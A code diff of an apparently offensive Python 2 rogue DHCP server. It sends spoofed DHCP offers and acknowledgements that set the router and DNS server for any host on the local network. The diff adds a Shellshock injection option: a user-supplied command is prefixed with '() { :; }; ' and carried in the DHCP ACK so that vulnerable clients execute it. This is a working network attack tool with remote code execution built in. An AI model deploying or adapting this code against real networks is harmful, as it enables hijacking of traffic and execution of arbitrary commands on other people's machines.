@@ -1,10 +1,10 @@
 from base import Base
-from network import Ethernet
+from network import Ethernet_raw, DHCP_raw
 from sys import exit
 from argparse import ArgumentParser
-from binascii import unhexlify
 from ipaddress import IPv4Address
-from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sniff, sendp
+from scapy.all import BOOTP, DHCP, sniff
+from socket import socket, AF_PACKET, SOCK_RAW
 
 Base.check_user()
 
@@ -14,6 +14,7 @@ parser.add_argument('-i', '--interface', help='Set interface name for send reply
 parser.add_argument('-f', '--first_offer_ip', type=str, required=True, help='Set first client ip for offering')
 parser.add_argument('-l', '--last_offer_ip', type=str, required=True, help='Set last client ip for offering')
 
+parser.add_argument('-c', '--shellshock_command', type=str, help='Set shellshock command in DHCP client')
 parser.add_argument('--dhcp_mac', type=str, help='Set DHCP server mac address, if not set use your mac address')
 parser.add_argument('--dhcp_ip', type=str, help='Set DHCP server IP address, if not set use your ip address')
 parser.add_argument('--router', type=str, help='Set router IP address, if not set use your ip address')
@@ -23,6 +24,9 @@ parser.add_argument('--dns', type=str, help='Set DNS server IP address, if not s
 parser.add_argument('--lease_time', type=int, help='Set lease time, default=172800', default=172800)
 
 args = parser.parse_args()
+
+eth = Ethernet_raw()
+dhcp = DHCP_raw()
 
 current_network_interface = None
 target_mac_address = None
@@ -34,6 +38,10 @@ network_mask = None
 network_broadcast = None
 dns_server_ip_address = None
 number_of_dhcp_request = 0
+shellshock_url = None
+
+if args.shellshock_command is not None:
+    shellshock_url = "() { :; }; " + args.shellshock_command
 
 if args.interface is None:
     current_network_interface = Base.netiface_selection()
@@ -101,35 +109,37 @@ print "DNS server IP address: " + dns_server_ip_address + "\r\n"
 
 
 def make_dhcp_offer_packet(transaction_id):
-    return (Ether(src=dhcp_server_mac_address, dst=target_mac_address) /
-            IP(src=dhcp_server_ip_address, dst='255.255.255.255') /
-            UDP(sport=67, dport=68) /
-            BOOTP(op='BOOTREPLY', chaddr=unhexlify(target_mac_address.replace(":", "")),
-                  yiaddr=offer_ip_address, siaddr="0.0.0.0", xid=transaction_id) /
-            DHCP(options=[("message-type", "offer"),
-                          ('server_id', dhcp_server_ip_address),
-                          ('subnet_mask', network_mask),
-                          ('broadcast_address', network_broadcast),
-                          ('router', router_ip_address),
-                          ('lease_time', args.lease_time),
-                          ('name_server', dns_server_ip_address),
-                          "end"]))
+    return dhcp.make_response_packet(source_mac=dhcp_server_mac_address,
+                                     destination_mac=target_mac_address,
+                                     source_ip=dhcp_server_ip_address,
+                                     destination_ip="255.255.255.255",
+                                     transaction_id=transaction_id,
+                                     your_ip=offer_ip_address,
+                                     client_mac=target_mac_address,
+                                     dhcp_server_id=dhcp_server_ip_address,
+                                     lease_time=args.lease_time,
+                                     netmask=network_mask,
+                                     router=router_ip_address,
+                                     dns=dns_server_ip_address,
+                                     dhcp_operation=2,
+                                     url=None)
 
 
 def make_dhcp_ack_packet(transaction_id, requested_ip):
-    return (Ether(src=dhcp_server_mac_address, dst=target_mac_address) /
-            IP(src=dhcp_server_ip_address, dst=requested_ip) /
-            UDP(sport=67, dport=68) /
-            BOOTP(op='BOOTREPLY', chaddr=unhexlify(target_mac_address.replace(":", "")),
-                  yiaddr=requested_ip, siaddr="0.0.0.0", xid=transaction_id) /
-            DHCP(options=[("message-type", "ack"),
-                          ('server_id', dhcp_server_ip_address),
-                          ('subnet_mask', network_mask),
-                          ('broadcast_address', network_broadcast),
-                          ('router', router_ip_address),
-                          ('lease_time', args.lease_time),
-                          ('name_server', dns_server_ip_address),
-                          "end"]))
+    return dhcp.make_response_packet(source_mac=dhcp_server_mac_address,
+                                     destination_mac=target_mac_address,
+                                     source_ip=dhcp_server_ip_address,
+                                     destination_ip=requested_ip,
+                                     transaction_id=transaction_id,
+                                     your_ip=requested_ip,
+                                     client_mac=target_mac_address,
+                                     dhcp_server_id=dhcp_server_ip_address,
+                                     lease_time=args.lease_time,
+                                     netmask=network_mask,
+                                     router=router_ip_address,
+                                     dns=dns_server_ip_address,
+                                     dhcp_operation=5,
+                                     url=shellshock_url)
 
 
 def dhcp_reply(request):
@@ -138,9 +148,10 @@ def dhcp_reply(request):
         global target_mac_address
         global number_of_dhcp_request
 
-        next_offer_ip_address = IPv4Address(args.first_offer_ip) + number_of_dhcp_request
-        if IPv4Address(next_offer_ip_address) < IPv4Address(args.last_offer_ip):
-            offer_ip_address = next_offer_ip_address
+        next_offer_ip_address = IPv4Address(unicode(args.first_offer_ip)) + number_of_dhcp_request
+        if IPv4Address(next_offer_ip_address) < IPv4Address(unicode(args.last_offer_ip)):
+            number_of_dhcp_request += 1
+            offer_ip_address = str(next_offer_ip_address)
         else:
             number_of_dhcp_request = 0
             offer_ip_address = args.first_offer_ip
@@ -148,21 +159,30 @@ def dhcp_reply(request):
         transaction_id = request[BOOTP].xid
         target_mac_address = ":".join("{:02x}".format(ord(c)) for c in request[BOOTP].chaddr[0:6])
 
+        SOCK = socket(AF_PACKET, SOCK_RAW)
+        SOCK.bind((current_network_interface, 0))
+
         if request[DHCP].options[0][1] == 1:
-            print "DHCP DISCOVER from: " + target_mac_address + " transaction id: " + hex(transaction_id)
+            print "DHCP DISCOVER from: " + target_mac_address + " transaction id: " + hex(transaction_id) + \
+                  " offer ip:     " + offer_ip_address
             offer_packet = make_dhcp_offer_packet(transaction_id)
-            sendp(offer_packet, iface=current_network_interface, verbose=False)
+            SOCK.send(offer_packet)
 
         if request[DHCP].options[0][1] == 3:
-            requested_ip = str(request[DHCP].options[2][1])
+            for option in request[DHCP].options:
+                if option[0] == "requested_addr":
+                    requested_ip = str(option[1])
             print "DHCP REQUEST from:  " + target_mac_address + " transaction id: " + hex(transaction_id) + \
                   " requested ip: " + requested_ip
             ack_packet = make_dhcp_ack_packet(transaction_id, requested_ip)
-            sendp(ack_packet, iface=current_network_interface, verbose=False)
+            SOCK.send(ack_packet)
+
+        SOCK.close()
 
 
 if __name__ == "__main__":
     print "Waiting for a DHCP DISCOVER or DHCP REQUEST ..."
-    sniff(lfilter=lambda d: d.src != Ethernet.get_mac_for_dhcp_discover(),
+    sniff(lfilter=lambda d: d.src != eth.get_random_mac() and
+                            d.src != Base.get_netiface_mac_address(current_network_interface),
           filter="udp and src port 68 and dst port 67 and src host 0.0.0.0 and dst host 255.255.255.255",
           prn=dhcp_reply, iface=current_network_interface)
